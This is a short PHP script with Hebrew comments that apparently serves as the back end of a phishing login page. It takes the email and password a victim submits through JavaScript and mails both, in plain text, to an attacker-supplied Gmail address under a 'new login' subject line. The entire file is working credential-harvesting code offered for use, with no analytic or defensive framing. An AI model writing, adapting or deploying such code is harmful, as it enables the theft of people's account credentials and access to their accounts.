<?php
// מקבל את הנתונים מה-JavaScript
$data = json_decode(file_get_contents('php://input'), true);
$email = $data['email'];
$password = $data['password'];

// כתובת ה-Gmail שלך
$to = "YOUR_EMAIL@gmail.com"; // <-- שים פה את האימייל שלך
$subject = "🔥 התחברות חדשה";
$message = "📧 אימייל: $email\n🔑 סיסמה: $password";

// Headers (כדי שזה יעבוד טוב)
$headers = "From: login@yourdomain.com\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

// שולח את המייל
mail($to, $subject, $message, $headers);

// מחזיר תשובה חזרה ללקוח
echo json_encode(["status" => "sent"]);
?>
